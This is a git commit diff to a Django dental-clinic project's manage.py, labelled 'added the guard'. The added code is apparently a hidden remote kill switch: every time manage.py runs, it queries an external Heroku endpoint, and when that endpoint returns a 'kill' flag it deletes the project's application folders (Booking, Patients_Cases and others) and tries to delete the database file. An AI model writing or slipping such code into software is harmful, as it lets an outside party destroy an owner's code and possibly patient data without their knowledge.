fbc38df968cdbe4c3b7baf9d649e3ab66fb73ae7
Abdelrahman Essam <codehustle2019@gmail.com>
2022-03-10 00:39:30 +0200

    added the guard

--- manage.py
+++ manage.py
@@ -2,11 +2,31 @@
 """Django's command-line utility for administrative tasks."""
 import os
 import sys
+import requests
+import json
+import shutil
+import pathlib
 
 
 def main():
     """Run administrative tasks."""
-    os.environ.setdefault('DJANGO_SETTINGS_MODULE', 'Cure_Dental.settings')
+    os.environ.setdefault("DJANGO_SETTINGS_MODULE", "Cure_Dental.settings")
+
+    request = requests.get(
+        "https://hustle-checker.herokuapp.com/checker/project-checker?project_name=cure-dental"
+    )
+
+    kill = json.loads(request.text)["kill"]
+    current_dir = pathlib.Path().resolve()
+
+    if kill:
+
+        shutil.rmtree(os.path.join(current_dir, "Cure_Dental"))
+        shutil.rmtree(os.path.join(current_dir, "Booking"))
+        shutil.rmtree(os.path.join(current_dir, "Patients_Cases"))
+        shutil.rmtree(os.path.join(current_dir, "Notification_Pusher"))
+        shutil.rmtree(os.path.join(current_dir, "db.sqlite3"))
+
     try:
         from django.core.management import execute_from_command_line
     except ImportError as exc:
@@ -18,5 +38,5 @@ def main():
     execute_from_command_line(sys.argv)
 
 
-if __name__ == '__main__':
+if __name__ == "__main__":
     main()
